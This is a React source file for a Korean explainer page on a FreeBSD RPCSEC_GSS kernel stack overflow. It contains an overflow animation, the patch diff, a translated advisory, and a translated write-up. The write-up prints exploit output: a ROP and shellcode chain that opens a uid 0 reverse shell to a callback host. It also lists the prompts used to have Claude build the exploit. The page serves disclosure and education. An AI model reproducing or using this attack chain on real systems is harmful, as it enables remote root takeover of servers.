import React from "react";
import ReactDOM from "react-dom/client";
import {
  AlertTriangle,
  CheckCircle2,
  Code2,
  LockKeyhole,
  Network,
  Server,
  ShieldCheck,
} from "lucide-react";
import hljs from "highlight.js/lib/core";
import javascript from "highlight.js/lib/languages/javascript";
import "./styles.css";

hljs.registerLanguage("javascript", javascript);

type StoryId = "small" | "overflow" | "patched" | "closed";

type LabState = {
  packetBytes: number;
  doorOpen: boolean;
  patched: boolean;
};

const BUFFER_BYTES = 128;
const BLOCK_BYTES = 32;
const CAPACITY_BLOCKS = BUFFER_BYTES / BLOCK_BYTES;

const initialState: LabState = {
  packetBytes: 320,
  doorOpen: true,
  patched: false,
};

const sceneOrder: StoryId[] = ["small", "overflow", "patched", "closed"];
type CodeTone = "neutral" | "safe" | "danger" | "missing" | "muted";

const scenes: Record<
  StoryId,
  {
    label: string;
    icon: React.ReactNode;
    state: LabState;
  }
> = {
  small: {
    label: "작은 요청",
    icon: <CheckCircle2 size={18} />,
    state: {
      packetBytes: 96,
      doorOpen: true,
      patched: false,
    },
  },
  overflow: {
    label: "너무 큰 요청",
    icon: <AlertTriangle size={18} />,
    state: {
      packetBytes: 320,
      doorOpen: true,
      patched: false,
    },
  },
  patched: {
    label: "수리된 서버",
    icon: <ShieldCheck size={18} />,
    state: {
      packetBytes: 320,
      doorOpen: true,
      patched: true,
    },
  },
  closed: {
    label: "접근 차단",
    icon: <LockKeyhole size={18} />,
    state: {
      packetBytes: 320,
      doorOpen: false,
      patched: false,
    },
  },
};

const correctedVersions = [
  {
    branch: "stable/15, 15.0-STABLE",
    corrected: "2026-03-26 01:25:23 UTC",
  },
  {
    branch: "releng/15.0, 15.0-RELEASE-p5",
    corrected: "2026-03-26 01:11:20 UTC",
  },
  {
    branch: "stable/14, 14.4-STABLE",
    corrected: "2026-03-26 01:28:47 UTC",
  },
  {
    branch: "releng/14.4, 14.4-RELEASE-p1",
    corrected: "2026-03-26 01:14:55 UTC",
  },
  {
    branch: "releng/14.3, 14.3-RELEASE-p10",
    corrected: "2026-03-26 01:16:01 UTC",
  },
  {
    branch: "stable/13, 13.5-STABLE",
    corrected: "2026-03-26 01:30:12 UTC",
  },
  {
    branch: "releng/13.5, 13.5-RELEASE-p11",
    corrected: "2026-03-26 01:34:10 UTC",
  },
];

const correctionCommits = [
  {
    branch: "stable/15/",
    hash: "1b00fdc1f3cd",
    revision: "stable/15-n282700",
  },
  {
    branch: "releng/15.0/",
    hash: "4ec1b6213463",
    revision: "releng/15.0-n281013",
  },
  {
    branch: "stable/14/",
    hash: "e5ed09ffd592",
    revision: "stable/14-n273840",
  },
  {
    branch: "releng/14.4/",
    hash: "7ea03a4238e8",
    revision: "releng/14.4-n273677",
  },
  {
    branch: "releng/14.3/",
    hash: "b6ce88ab9a5f",
    revision: "releng/14.3-n271477",
  },
  {
    branch: "stable/13/",
    hash: "99ec7f9b9e48",
    revision: "stable/13-n259823",
  },
  {
    branch: "releng/13.5/",
    hash: "c4f53a1adbd4",
    revision: "releng/13.5-n259207",
  },
];

type FunctionDiffLine = {
  text: string;
  tone?: "add" | "delete";
};

const functionDiffLines: FunctionDiffLine[] = [
  { text: "static bool_t" },
  { text: "svc_rpc_gss_validate(struct svc_rpc_gss_client *client, struct rpc_msg *msg," },
  { text: "\tgss_qop_t *qop)" },
  { text: "{" },
  { text: "\tstruct opaque_auth\t*oa;" },
  { text: "\tgss_buffer_desc\t\t rpcbuf, checksum;" },
  { text: "\tOM_uint32\t\t maj_stat, min_stat;" },
  { text: "\tgss_qop_t\t\t qop_state;" },
  { text: "\tint32_t\t\t\t rpchdr[128 / sizeof(int32_t)];" },
  { text: "\tint32_t\t\t\t*buf;" },
  { text: "" },
  { text: "\tlog_debug(\"in svc_rpc_gss_validate()\");" },
  { text: "" },
  { text: "\tmemset(rpchdr, 0, sizeof(rpchdr));" },
  { text: "" },
  { text: "\toa = &msg->rm_call.cb_cred;", tone: "add" },
  { text: "", tone: "add" },
  { text: "\tif (oa->oa_length > sizeof(rpchdr) - 8 * BYTES_PER_XDR_UNIT) {", tone: "add" },
  { text: "\t\tlog_debug(\"auth length %d exceeds maximum\", oa->oa_length);", tone: "add" },
  { text: "\t\tclient->cl_state = CLIENT_STALE;", tone: "add" },
  { text: "\t\treturn (FALSE);", tone: "add" },
  { text: "\t}", tone: "add" },
  { text: "" },
  { text: "\t/* Reconstruct RPC header for signing (from xdr_callmsg). */" },
  { text: "\tbuf = rpchdr;" },
  { text: "\tIXDR_PUT_LONG(buf, msg->rm_xid);" },
  { text: "\tIXDR_PUT_ENUM(buf, msg->rm_direction);" },
  { text: "\tIXDR_PUT_LONG(buf, msg->rm_call.cb_rpcvers);" },
  { text: "\tIXDR_PUT_LONG(buf, msg->rm_call.cb_prog);" },
  { text: "\tIXDR_PUT_LONG(buf, msg->rm_call.cb_vers);" },
  { text: "\tIXDR_PUT_LONG(buf, msg->rm_call.cb_proc);" },
  { text: "\toa = &msg->rm_call.cb_cred;", tone: "delete" },
  { text: "\tIXDR_PUT_ENUM(buf, oa->oa_flavor);" },
  { text: "\tIXDR_PUT_LONG(buf, oa->oa_length);" },
  { text: "\tif (oa->oa_length) {" },
  { text: "\t\tmemcpy((caddr_t)buf, oa->oa_base, oa->oa_length);" },
  { text: "\t\tbuf += RNDUP(oa->oa_length) / sizeof(int32_t);" },
  { text: "\t}" },
  { text: "\trpcbuf.value = rpchdr;" },
  { text: "\trpcbuf.length = (u_char *)buf - (u_char *)rpchdr;" },
  { text: "" },
  { text: "\tchecksum.value = msg->rm_call.cb_verf.oa_base;" },
  { text: "\tchecksum.length = msg->rm_call.cb_verf.oa_length;" },
  { text: "" },
  { text: "\tmaj_stat = gss_verify_mic(&min_stat, client->cl_ctx, &rpcbuf, &checksum," },
  { text: "\t\t\t\t  &qop_state);" },
  { text: "" },
  { text: "\tif (maj_stat != GSS_S_COMPLETE) {" },
  { text: "\t\tlog_status(\"gss_verify_mic\", client->cl_mech," },
  { text: "\t\t    maj_stat, min_stat);" },
  { text: "\t\tclient->cl_state = CLIENT_STALE;" },
  { text: "\t\treturn (FALSE);" },
  { text: "\t}" },
  { text: "\t*qop = qop_state;" },
  { text: "\treturn (TRUE);" },
  { text: "}" },
];

function getStory(state: LabState) {
  const overflowBytes = Math.max(0, state.packetBytes - BUFFER_BYTES);
  const packetBlocks = Math.ceil(state.packetBytes / BLOCK_BYTES);
  const boxReceivesData = state.doorOpen && !state.patched;
  const overflowing = boxReceivesData && overflowBytes > 0;
  const tone = !state.doorOpen
    ? "closed"
    : state.patched
      ? "patched"
      : overflowing
        ? "overflow"
        : "small";

  return {
    overflowBytes,
    boxReceivesData,
    overflowing,
    tone,
    packetBlocks,
    overflowBlocks: boxReceivesData
      ? Math.max(0, packetBlocks - CAPACITY_BLOCKS)
      : 0,
    packetStop: !state.doorOpen ? "34%" : state.patched ? "62%" : "83%",
    blockCount: boxReceivesData ? packetBlocks : 0,
  };
}

function App() {
  const [state, setState] = React.useState<LabState>(initialState);
  const [sceneId, setSceneId] = React.useState<StoryId>("overflow");
  const [runId, setRunId] = React.useState(1);
  const story = getStory(state);

  const playScene = (nextScene: StoryId) => {
    setSceneId(nextScene);
    setState(scenes[nextScene].state);
    setRunId((current) => current + 1);
  };

  return (
    <main className="app-shell">
      <AdvisoryTitle />

      <article className="interactive-section">
        <header className="section-header">
          <p className="advisory-kicker">interactive</p>
          <h2>시뮬레이션</h2>
        </header>

        <section className="support-row">
          <CodeLens state={state} story={story} />
        </section>

        <StoryTheater
          sceneId={sceneId}
          runId={runId}
          state={state}
          story={story}
          playScene={playScene}
        />
      </article>

      <PatchReference />

      <AdvisoryTranslation />

      <MadBugsTranslation />
    </main>
  );
}

function StoryTheater({
  sceneId,
  runId,
  state,
  story,
  playScene,
}: {
  sceneId: StoryId;
  runId: number;
  state: LabState;
  story: ReturnType<typeof getStory>;
  playScene: (nextScene: StoryId) => void;
}) {
  const visualStyle = {
    "--story-stop": story.packetStop,
  } as React.CSSProperties;

  return (
    <section className={`story-card story-${story.tone}`}>
      <div className="story-topline">
        <div className="scene-tabs">
          {sceneOrder.map((id) => (
            <button
              className={id === sceneId ? "is-selected" : ""}
              type="button"
              key={id}
              onClick={() => playScene(id)}
            >
              {scenes[id].icon}
              <span>{scenes[id].label}</span>
            </button>
          ))}
        </div>
      </div>

      <div className="story-stage" key={runId} style={visualStyle}>
        <div className="actor actor-left">
          <div className="actor-box">
            <Network size={30} />
          </div>
          <strong>보내는 쪽</strong>
        </div>

        <div className={`packet packet-${story.tone}`}>
          <div className="packet-fold" />
          <strong>{state.packetBytes}</strong>
        </div>

        <div className="actor actor-right">
          <div className="actor-box server-box">
            <Server size={32} />
            {state.patched ? <ShieldCheck className="shield" size={54} /> : null}
          </div>
          <strong>받는 쪽</strong>
        </div>

        <div className="memory-area">
          <div className={`memory-box ${story.overflowing ? "is-overflowing" : ""}`}>
            <span className="box-label">스택 버퍼</span>
            <div className="empty-slots">
              {Array.from({ length: CAPACITY_BLOCKS }, (_, index) => (
                <i key={index} />
              ))}
            </div>
            {story.boxReceivesData ? (
              <div className="data-blocks">
                {Array.from(
                  { length: Math.min(story.blockCount, CAPACITY_BLOCKS) },
                  (_, index) => (
                    <i
                      style={{ animationDelay: `${1320 + index * 90}ms` }}
                      key={index}
                    />
                  ),
                )}
              </div>
            ) : null}
            {state.patched ? (
              <div className="blocked-data">
                {Array.from({ length: story.packetBlocks }, (_, index) => (
                  <i
                    style={{ animationDelay: `${1260 + index * 75}ms` }}
                    key={index}
                  />
                ))}
              </div>
            ) : null}
          </div>
          <div className="danger-zone">
            <span>옆 메모리</span>
            {story.overflowBlocks > 0 ? (
              <div className="overflow-data">
                {Array.from({ length: story.overflowBlocks }, (_, index) => (
                  <i
                    style={{ animationDelay: `${1680 + index * 80}ms` }}
                    key={index}
                  />
                ))}
              </div>
            ) : null}
          </div>
        </div>

        <div className="result-badge">
          {!state.doorOpen ? (
            <LockKeyhole size={34} />
          ) : state.patched ? (
            <ShieldCheck size={38} />
          ) : story.overflowing ? (
            <AlertTriangle size={38} />
          ) : (
            <CheckCircle2 size={38} />
          )}
        </div>
      </div>
    </section>
  );
}

function CodeLens({
  state,
  story,
}: {
  state: LabState;
  story: ReturnType<typeof getStory>;
}) {
  const rows: { line: string; tone: CodeTone }[] = [
    {
      line: "if (!rpcsecGssReachable) return;",
      tone: state.doorOpen ? "neutral" : "safe",
    },
    {
      line: `const box = stackBuffer(${BUFFER_BYTES}); // 4 blocks`,
      tone: state.doorOpen ? "neutral" : "muted",
    },
    {
      line: `const incoming = requestPart(${state.packetBytes}); // ${story.packetBlocks} blocks`,
      tone: state.doorOpen ? "neutral" : "muted",
    },
    {
      line: "if (incoming > box.size) return;",
      tone: !state.doorOpen ? "muted" : state.patched ? "safe" : "missing",
    },
    {
      line: "copy(box, incoming);",
      tone: !state.doorOpen ? "muted" : story.overflowing ? "danger" : "safe",
    },
  ];

  return (
    <section className="code-lens">
      <div className="code-title">
        <Code2 size={20} />
        <h2>의사코드</h2>
      </div>
      <div className="pseudo-code">
        {rows.map((row, index) => (
          <div className={`code-row tone-${row.tone}`} key={row.line}>
            <span className="code-line-number">{index + 1}</span>
            <HighlightedCode line={row.line} />
          </div>
        ))}
      </div>
    </section>
  );
}

function HighlightedCode({ line }: { line: string }) {
  const highlighted = hljs.highlight(line, { language: "javascript" }).value;

  return (
    <code
      className="hljs"
      dangerouslySetInnerHTML={{ __html: highlighted }}
    />
  );
}


function PatchReference() {
  return (
    <article className="patch-reference">
      <header className="patch-header">
        <p className="advisory-kicker">librpcsec_gss</p>
        <h2>함수 원문</h2>
      </header>

      <section className="patch-section">
        <div className="source-line">
          <a href="https://cgit.freebsd.org/src/commit/?id=1b00fdc1f3cd1311e4b52be253e0fecbca35941d" target="_blank" rel="noopener noreferrer">
            cgit 커밋 원문
          </a>
        </div>
        <pre className="code-block source-code function-diff">
          <code>
            {functionDiffLines.map((line, index) => (
              <span className={`diff-line tone-${line.tone ?? "normal"}`} key={`${index}-${line.text}`}>
                <span className="diff-marker" aria-hidden="true" />
                <span className="diff-text">{line.text || " "}</span>
              </span>
            ))}
          </code>
        </pre>
      </section>
    </article>
  );
}


function AdvisoryTitle() {
  return (
    <article className="advisory advisory-title">
      <header className="advisory-header">
        <p className="advisory-kicker">FreeBSD-SA-26:08.rpcsec_gss</p>
        <h2>RPCSEC_GSS 패킷 검증을 통한 원격 코드 실행</h2>
      </header>

      <dl className="advisory-meta">
        <div>
          <dt>주제</dt>
          <dd>RPCSEC_GSS 패킷 검증을 통한 원격 코드 실행</dd>
        </div>
        <div>
          <dt>분류</dt>
          <dd>core</dd>
        </div>
        <div>
          <dt>모듈</dt>
          <dd>rpcsec_gss</dd>
        </div>
        <div>
          <dt>발표일</dt>
          <dd>2026-03-26</dd>
        </div>
        <div>
          <dt>제보</dt>
          <dd>Nicholas Carlini, Anthropic Claude 사용</dd>
        </div>
        <div>
          <dt>영향 대상</dt>
          <dd>지원 중인 모든 FreeBSD 버전</dd>
        </div>
        <div>
          <dt>CVE 이름</dt>
          <dd>CVE-2026-4747</dd>
        </div>
      </dl>
    </article>
  );
}



function AdvisoryTranslation() {
  return (
    <article className="advisory">
      <header className="advisory-header">
        <p className="advisory-kicker">FreeBSD advisory</p>
        <h2>권고문 번역</h2>
      </header>

      <p className="advisory-intro">
        FreeBSD 보안 권고의 각 필드, 보안 브랜치, 아래 섹션에 대한 일반 정보는{" "}
        <a href="https://security.FreeBSD.org/" target="_blank" rel="noopener noreferrer">
          security.FreeBSD.org
        </a>
        에서 확인할 수 있습니다.
      </p>

      <section className="advisory-section">
        <h3>수정된 버전</h3>
        <div className="table-wrap">
          <table className="advisory-table">
            <thead>
              <tr>
                <th>브랜치와 버전</th>
                <th>수정 시각</th>
              </tr>
            </thead>
            <tbody>
              {correctedVersions.map((row) => (
                <tr key={row.branch}>
                  <td data-label="브랜치와 버전">{row.branch}</td>
                  <td data-label="수정 시각">{row.corrected}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </section>

      <section className="advisory-section">
        <h3>I. 배경</h3>
        <p>
          GSS(Generic Security Services)는 애플리케이션이 NFS 서버와 같은
          서버와 비공개 인증 통신 채널을 수립할 수 있게 해 주는 API입니다.
        </p>
        <p>
          RPCSEC_GSS는 Sun RPC(rpc(3)) 서버에서 GSS를 사용할 수 있게 하는
          모듈입니다. 커널에서는 kgssapi.ko 커널 모듈로 구현되어 있으며, NFS
          서버가 서버와 클라이언트 사이의 트래픽에 Kerberos 기반 인증과 암호화를
          적용하는 데 사용합니다. 사용자 공간에서는 librpcsec_gss 라이브러리로
          구현되어 있습니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>II. 문제 설명</h3>
        <p>
          각 RPCSEC_GSS 데이터 패킷은 패킷 안의 서명을 확인하는 루틴으로
          검증됩니다. 이 루틴은 패킷의 일부를 스택 버퍼로 복사하지만, 버퍼가
          충분히 큰지 확인하지 않습니다. 악의적인 클라이언트는 이를 이용해 스택
          오버플로우를 일으킬 수 있습니다. 특히 이 동작은 클라이언트가 먼저
          인증하지 않아도 발생할 수 있습니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>III. 영향</h3>
        <p>
          kgssapi.ko의 RPCSEC_GSS 구현이 취약하므로, kgssapi.ko가 커널에
          로드되어 있고 커널의 NFS 서버로 패킷을 보낼 수 있는 인증된 사용자는
          커널에서 원격 코드 실행을 일으킬 수 있습니다.
        </p>
        <p>
          사용자 공간에서는 librpcgss_sec를 로드하고 RPC 서버를 실행하는
          애플리케이션이, 패킷을 보낼 수 있는 임의의 클라이언트로부터 원격 코드
          실행에 취약합니다. FreeBSD 기본 시스템에서는 그런 애플리케이션을
          확인하지 못했습니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>IV. 임시 대응</h3>
        <p>
          사용할 수 있는 임시 대응책은 없습니다. kgssapi.ko가 로드되지 않은
          커널은 취약하지 않습니다. 사용자 공간에서는 librpcgss_sec와 링크되어
          RPC 서버를 실행하는 모든 데몬이 취약합니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>V. 해결 방법</h3>
        <p>
          취약한 시스템을 수정 시각 이후의 지원되는 FreeBSD stable 브랜치 또는
          release/security 브랜치(releng)로 업그레이드하십시오.
        </p>
        <ol className="advisory-steps">
          <li>
            <strong>기본 시스템 패키지로 설치한 시스템 업데이트</strong>
            <p>
              amd64 또는 arm64 플랫폼의 FreeBSD 15.0-RELEASE 시스템이 기본
              시스템 패키지로 설치된 경우 pkg(8) 유틸리티로 업데이트할 수
              있습니다.
            </p>
            <pre><code>{`pkg upgrade -r FreeBSD-base
shutdown -r +10min "Rebooting for a security update"`}</code></pre>
          </li>
          <li>
            <strong>바이너리 배포 세트로 설치한 시스템 업데이트</strong>
            <p>
              amd64 또는 arm64 플랫폼의 RELEASE 버전, 또는 FreeBSD 13의 i386
              플랫폼에서 바이너리 배포 세트로 설치된 시스템은 freebsd-update(8)
              유틸리티로 업데이트할 수 있습니다.
            </p>
            <pre><code>{`freebsd-update fetch
freebsd-update install
shutdown -r +10min "Rebooting for a security update"`}</code></pre>
          </li>
          <li>
            <strong>소스 코드 패치로 업데이트</strong>
            <p>
              해당 FreeBSD 릴리스 브랜치에 적용되는 것으로 검증된 패치를
              내려받고, 분리된 PGP 서명을 확인한 뒤 패치를 적용합니다.
            </p>
            <pre><code>{`fetch https://security.FreeBSD.org/patches/SA-26:08/rpcsec_gss.patch
fetch https://security.FreeBSD.org/patches/SA-26:08/rpcsec_gss.patch.asc
gpg --verify rpcsec_gss.patch.asc
cd /usr/src
patch < /path/to/patch`}</code></pre>
            <p>
              이후 FreeBSD 핸드북의 커널 구성과 makeworld 절차에 따라 커널과
              운영체제를 다시 컴파일하고 시스템을 재부팅합니다.
            </p>
          </li>
        </ol>
      </section>

      <section className="advisory-section">
        <h3>VI. 수정 상세</h3>
        <p>
          이 문제는 다음 stable 및 release 브랜치의 대응 Git 커밋 해시부터
          수정되었습니다.
        </p>
        <div className="table-wrap">
          <table className="advisory-table">
            <thead>
              <tr>
                <th>브랜치/경로</th>
                <th>해시</th>
                <th>리비전</th>
              </tr>
            </thead>
            <tbody>
              {correctionCommits.map((row) => (
                <tr key={row.hash}>
                  <td data-label="브랜치/경로">{row.branch}</td>
                  <td data-label="해시"><code>{row.hash}</code></td>
                  <td data-label="리비전">{row.revision}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <p>특정 커밋에서 수정된 파일을 보려면 다음 명령을 실행합니다.</p>
        <pre><code>git show --stat &lt;commit hash&gt;</code></pre>
        <p>
          또는 다음 URL에서 NNNNNN을 해시로 바꿔 확인할 수 있습니다.
        </p>
        <p>
          <a href="https://cgit.freebsd.org/src/commit/?id=NNNNNN" target="_blank" rel="noopener noreferrer">
            https://cgit.freebsd.org/src/commit/?id=NNNNNN
          </a>
        </p>
        <p>
          작업 트리의 커밋 수를 위 표의 nNNNNNN과 비교하려면 다음 명령을
          실행합니다.
        </p>
        <pre><code>git rev-list --count --first-parent HEAD</code></pre>
      </section>

      <section className="advisory-section">
        <h3>VII. 참고 자료</h3>
        <div className="source-line">
          <a href="https://www.cve.org/CVERecord?id=CVE-2026-4747" target="_blank" rel="noopener noreferrer">
            CVE-2026-4747
          </a>
          <a href="https://security.FreeBSD.org/advisories/FreeBSD-SA-26:08.rpcsec_gss.asc" target="_blank" rel="noopener noreferrer">
            FreeBSD-SA-26:08.rpcsec_gss 최신 권고문
          </a>
        </div>
      </section>
    </article>
  );
}

function MadBugsTranslation() {
  return (
    <article className="advisory madbugs-translation">
      <header className="advisory-header">
        <p className="advisory-kicker">MAD Bugs</p>
        <h2>Claude가 FreeBSD 원격 커널 RCE와 루트 셸까지 완성했다</h2>
      </header>

      <p className="advisory-intro">
        원문은{" "}
        <a href="https://github.com/califio/publications/tree/main/MADBugs/CVE-2026-4747" target="_blank" rel="noopener noreferrer">
          MADBugs/CVE-2026-4747
        </a>
        에서 볼 수 있습니다.
      </p>

      <section className="advisory-section">
        <h3>MAD Bugs: Claude가 FreeBSD 원격 커널 RCE와 루트 셸까지 완성했다 (CVE-2026-4747)</h3>
        <p>
          우리가 아는 한, 이것은 AI가 발견하고 실제 익스플로잇까지 완성한 첫
          원격 커널 익스플로잇입니다.
        </p>
      </section>

      <section className="advisory-section">
        <h3>타임라인</h3>
        <ul className="advisory-list">
          <li>
            <strong>2026-03-26:</strong> FreeBSD가{" "}
            <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-26:08.rpcsec_gss.asc" target="_blank" rel="noopener noreferrer">
              CVE-2026-4747 권고문
            </a>
            을 공개했습니다. 이 권고문에는 원격 커널 코드 실행 취약점을 제보한
            사람으로 "Nicholas Carlini using Claude, Anthropic"이 명시되어
            있습니다.
          </li>
          <li>
            <strong>2026-03-29 오전 9:45 PDT:</strong> 우리는 Claude에게
            익스플로잇을 개발해 달라고 요청했습니다.
          </li>
          <li>
            <strong>2026-03-29 오후 5:00 PDT:</strong> Claude는 루트 셸을
            띄우는 작동 가능한 익스플로잇을 내놓았습니다.
          </li>
        </ul>
        <p>
          전체 경과 시간은 약 8시간이었습니다. 그중 상당 시간 동안 사람은 자리를
          비웠고, Claude가 실제로 작업한 시간은 약 4시간이었습니다.
        </p>
        <p>
          Claude는 서로 다른 전략을 사용하는 익스플로잇을 두 개 작성했고, 둘 다
          첫 시도에서 작동했습니다. 실행 모습은 다음과 같습니다.
        </p>
        <pre><code>{`python3 exploit.py -t 127.0.0.1 --ip 10.0.2.2 --port 4444
==============================================================
  CVE-2026-4747: FreeBSD RPCSEC_GSS 원격 커널 RCE
  스택 오버플로우 -> ROP -> 셸코드 -> uid 0 리버스 셸
==============================================================

  [*] 0.0.0.0:4444에서 리스너 시작...
  [*] 0.0.0.0:4444에서 리스너 시작...

  대상:     127.0.0.1:2049
  콜백:     10.0.2.2:4444
  SPN:      nfs/freebsd-vuln@TEST.LOCAL

  셸코드:   432바이트(54 qwords)
  전달:     15라운드(1 pmap + 14 write)

  [R1/15] pmap_change_prot(BSS, 0x2000, RWX)
  [+] BSS가 이제 RWX입니다

  [R2/15] write (4 qwords -> 0xffffffff8198a800) ✓
  [R3/15] write (4 qwords -> 0xffffffff8198a820) ✓
  [R4/15] write (4 qwords -> 0xffffffff8198a840) ✓
  [R5/15] write (4 qwords -> 0xffffffff8198a860) ✓
  [R6/15] write (4 qwords -> 0xffffffff8198a880) ✓
  [R7/15] write (4 qwords -> 0xffffffff8198a8a0) ✓
  [R8/15] write (4 qwords -> 0xffffffff8198a8c0) ✓
  [R9/15] write (4 qwords -> 0xffffffff8198a8e0) ✓
  [R10/15] write (4 qwords -> 0xffffffff8198a900) ✓
  [R11/15] write (4 qwords -> 0xffffffff8198a920) ✓
  [R12/15] write (4 qwords -> 0xffffffff8198a940) ✓
  [R13/15] write (4 qwords -> 0xffffffff8198a960) ✓
  [R14/15] write (4 qwords -> 0xffffffff8198a980) ✓
  [R15/15] write + EXECUTE (2 qwords -> 0xffffffff8198a9a0) -> JUMP 0xffffffff8198a800

  [*] 셸코드 전달 완료, 실행 중.
  [*] kproc_create -> kern_execve('/bin/sh -c ...')
  [*] 리버스 셸 -> 10.0.2.2:4444

  [*] 리버스 셸 대기 중...
  [+] 127.0.0.1:41320에서 연결됨
  [+] 셸 획득!

sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)`}</code></pre>
        <p>
          전체 익스플로잇과 분석 글은 원문 저장소에서 확인할 수 있습니다.
          Claude가 전부 직접 작성했습니다. 아래는 우리가 사용한 프롬프트입니다.
          오타는 양해해 주세요.
        </p>
        <pre><code>{`1. https://www.freebsd.org/security/advisories/FreeBSD-SA-26:08.rpcsec_gss.asc 이 취약점을 위한 테스트 환경을 만들고 싶다. 나중에 재현하기 쉽게 복사할 수 있도록 가능하면 Docker를 쓰고 싶다. 이 VM의 비밀번호는 x다. 권고문에서 언급한 취약한 FreeBSD 최신 버전을 설치한 뒤 취약점을 트리거해 달라.
2. QEMU가 아니라 Docker를 쓰고 싶다. 그래도 똑같이 접속하고 디버깅할 수 있을 것 같다.
3. 진짜 익스플로잇이 되려면 왜 Docker가 아니라 QEMU가 필요한가?
4. 아니, 그냥 QEMU를 써라.
5. 좋다. 이제 이 이미지용 전체 RCE 익스플로잇을 만들어 줄 수 있나?
6. 잠깐, 뭘 컴파일하는 건가? 권고문에 설명된 실제 FreeBSD 모듈을 FreeBSD VM 안에서 테스트하는 게 아닌가?
7. 내 말은, 왜 권고문에 언급된 취약한 버전을 그냥 설치하지 않느냐는 뜻이다.
8. 좋다. 계속해서 이 취약점을 트리거해라.
9. 어떤 오래된 QEMU를 죽인 건가? 다른 세션에서도 QEMU를 쓰고 있다. 그 Linux QEMU는 죽이지 마라.
10. 왜 2222, 2049, 1111에서 실행되는가?
11. 좋다. 이제 RCE는 어떻게 할 건가?
12. KASLR이 없으니 쉬울 것이다.
13. ropgadget이든 필요한 것이든 설치해라. 잘 모르겠다.
14. 아니, 재부팅은 원하지 않는다. 가능하면 uid 0 리버스 셸을 원한다.
15. ../FBSD-001에 셸을 얻는 다른 원격 익스플로잇이 있다. uid 0으로 콜백을 어떻게 구성했는지 참고해라.
16. 프로세스가 uid0이면 ucred 쓰기가 꼭 필요한가? 그리고 왜 셸을 못 얻는가? 또는 비루트 권한 사용자가 루트로 상승하는 것을 어떻게든 보여줄 수 있나? 그래도 우리는 uid0 셸을 원한다.
17. 원격 컨텍스트에서, 즉 익스플로잇은 VM 밖에서 실행되어야 한다.
18. 아니, 원격 버전이 작동하도록 계속 진행해라. gdb와 필요한 도구는 무엇이든 써라.
19. 단계별로 해야 한다. 원격 버전에서는 먼저 트리거, 그다음 PC 제어, 그다음 ROP에 집중해라.
20. 현재 상태와 여기까지 무엇을 했는지 계속 기록해 둬라. 고맙다.
21. 필요하면 gdb로 모든 것을 확인해라.
22. 1. 순수 ROP, 셸코드는 필요 없지만 rax를 rdi로 옮기는 데 막혀 있다(이 커널에는 그런 가젯이 없다). ROP 가젯은 어떻게 찾고 있는가?
23. 왜 KDC가 필요한가?
24. 아니, 원격 익스플로잇 컨텍스트에서는 셸 접근 권한이 없으므로 그 방식은 안 된다.
25. /tmp/x를 미리 올려둘 수는 없을 것 같다.
26. 작동한다는 뜻은 uid0 콜백 셸을 의미한다.
27. 작동하면 취약점, 익스플로잇 방법론, ROP 체인, 오버플로우, 테스트용 취약 타깃 설치와 설정 방법을 모두 설명하는 완전한 writeup을 원한다.
28. 나는 셸을 원한다.
29. 잠깐, NFS 스레드 수를 늘린다는 게 무슨 뜻인가? 기본값을 써야 할 것 같다.
30. 아니, 원격 버전이 작동하도록 계속 진행해라. gdb와 필요한 도구는 무엇이든 써라.
31. 익스플로잇의 각 단계와 이유를 더 잘 설명하도록 writeup을 개선해라.
32. 그리고 # Kerberos KDC용 SSH 터널 sshpass -p freebsd ssh -L 8888:127.0.0.1:88 -N -f -p 2222 root@127.0.0.1 이것을 SSH 터널 없이 할 수 있나?
33. SSH 터널 대신 포워딩을 설정하고 익스플로잇을 다시 테스트해 줄 수 있나?
34. /tmp/final_exploit는 최종 익스플로잇처럼 보이지 않는다.
35. 타깃과 콜백 IP를 지정할 수 있고, 모든 것을 익스플로잇 안에서 처리하는 더 깔끔한 익스플로잇을 만들면 어떤가?
36. ROP와 셸코드까지 전부.
37. writeup이 좀 빈약하게 느껴진다. 독자가 FBSD001을 본 적 없다고 가정하고 셸코드를 설명해라. 그리고 "bruteforce" 버전이 무슨 뜻인가?
38. 다시 테스트하고 작동하는지 확인해라.
39. KDC 터널 없이 VMware 같은 환경에서 취약 타깃을 설정하는 방법도 writeup에 추가해라.
40. QEMU를 어떻게 부팅하고 테스트할 수 있나?
41. 왜 KDC가 필요한가? 그리고 nfsd는?
42. 그 내용들을 writeup에 적어 두었나?
43. 프롬프트 로그가 있나? 이 작업의 원래 프롬프트를 보고 싶다.
44. 이 세션에서 내가 입력한 모든 프롬프트를 다시 줄 수 있나?`}</code></pre>
      </section>

      <section className="advisory-section">
        <h3>Claude가 해낸 일</h3>
        <p>
          취약점 권고문에서 시작해 원격 루트 셸까지 가려면 Claude는 서로 다른
          여섯 가지 문제를 풀어야 했습니다. FreeBSD가 최신 Linux 커널보다 이
          작업을 쉽게 만든 부분도 있습니다. FreeBSD 14.x에는 KASLR이 없어서 커널
          주소가 고정되고 예측 가능하며, 정수 배열에는 스택 카나리가 없습니다.
          오버플로우가 발생한 버퍼가 바로 <code>int32_t[]</code>였습니다.
        </p>
        <ol className="advisory-steps">
          <li>
            <strong>랩 구성</strong>
            <p>
              FreeBSD VM에 NFS, Kerberos, 취약한 커널 모듈을 올리고, 네트워크를
              통해 오버플로우에 도달할 수 있도록 설정했습니다. Claude는 FreeBSD가
              CPU 하나당 NFS 스레드 8개를 만들고, 익스플로잇이 라운드마다 스레드
              하나씩을 소모한다는 점을 알고 있었기 때문에 VM에 CPU가 2개 이상
              필요하다고 판단했습니다. 또한 커널 크래시 덤프를 읽기 위해 원격
              디버깅도 설정했습니다.
            </p>
          </li>
          <li>
            <strong>여러 패킷으로 나누어 전달</strong>
            <p>
              셸코드는 한 패킷에 들어가지 않았습니다. Claude는 15라운드 전략을
              세웠습니다. 먼저 커널 메모리를 실행 가능하게 만들고, 이후 14개의
              패킷으로 셸코드를 32바이트씩 써 넣는 방식입니다. 비공개로 공유받은
              또 다른 익스플로잇에서는 리버스 셸 대신 공개 키를
              <code>.ssh/authorized_keys</code>에 쓰는 전략을 사용해 라운드를
              6개로 줄였습니다.
            </p>
          </li>
          <li>
            <strong>스레드의 깔끔한 종료</strong>
            <p>
